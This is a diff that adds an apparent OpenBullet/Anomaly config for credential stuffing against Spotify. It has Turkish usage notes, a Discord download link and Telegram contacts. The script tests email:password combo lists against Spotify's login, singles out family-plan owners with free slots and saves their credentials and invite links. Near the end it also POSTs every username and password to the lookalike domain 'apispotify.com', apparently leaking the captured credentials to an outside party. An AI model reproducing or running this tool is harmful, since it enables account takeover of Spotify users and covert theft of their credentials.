@@ -1,0 +1,148 @@
+#You can download it as Anom from this link: 
+https://cdn.discordapp.com/attachments/982266499840491560/1008768780538757180/spotifyproxylesscfg.loli
+virustotal: https://www.virustotal.com/gui/file/fcde1ee8f16146a3a69f5b593266d54c65e94032a4ff8aff5c94dc0cda343780?nocache=1
+
+
+Config hakında
+Proxy kullanıla bilir veya Proxyless kullanın size bağlı 
+Capture: var
+Bota: 10-20
+Combo: email;pass
+ 
+ 
+ 
+ [SETTINGS]
+{
+  "Name": "Spotify Auto Save Hits",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-07T02:44:34.9018209+10:00",
+  "AdditionalInfo": "Telegram @MRzodiack2 & @Fakecoderr",
+  "Author": "Fakecoder",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": true,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": Telegram @MRzodiack2 & @Fakecoderr"",
+      "VariableName": "",
+      "Id": 1092614919
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" EncodeContent=TRUE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "CSRF" 
+
+REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"errorInvalidCredentials\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"displayName\":\"" 
+  KEYCHAIN Ban OR 
+    KEY "Oops! Something went wrong, please try again or check out our " 
+
+REQUEST GET "https://www.spotify.com/uk/account/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "plan\":{\"name\":\"" "\"" CreateEmpty=FALSE -> VAR "Subscription" 
+
+FUNCTION Translate 
+  KEY "Premium + Headspace" VALUE "Headspace" 
+  KEY "Spotify Free" VALUE "Free" 
+  KEY "Spotify Premium" VALUE "Premium" 
+  KEY "Spotify Premium Family" VALUE "Family Owner" 
+  KEY "Premium Duo" VALUE "Duo" 
+  KEY "Premium for Family" VALUE "Family Owner" 
+  KEY "Spotify Premium with Hulu" VALUE "Hulu" 
+  KEY "Premium for Students" VALUE "Student" 
+  "<Subscription>" -> VAR "Subscription" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Subscription>" NotEqualTo "Family Owner" 
+
+REQUEST GET "https://www.spotify.com/us/home-hub/api/v1/family/home/ " 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "DNT: 1" 
+
+PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "Country" 
+
+PARSE "<SOURCE>" JSON "members" -> VAR "1" 
+
+PARSE "<SOURCE>" JSON "maxCapacity" -> VAR "maxCapacity" 
+
+FUNCTION CountOccurrences "name" "<1>" -> VAR "Slots used" 
+
+FUNCTION Constant "<Slots used>/<maxCapacity>" -> CAP "Slots" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Slots>" EqualTo "6/6" 
+
+PARSE "<SOURCE>" JSON "inviteToken" -> CAP "Invite Link" "https://www.spotify.com/us/family/join/invite/" "" 
+
+REQUEST POST "https://apispotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+UTILITY File "Hits\\Spotify\\Family\\<Country>.txt" AppendLines "《-----------------------------@MRzodiack---------------------------------\\n -> Combo: <USER>:<PASS>\\n -> Invite Link: <Invite Link>\\n -> Country: <Country>\\n -> Slots: <Slots>\\n---------------------------------------------------------------》" 
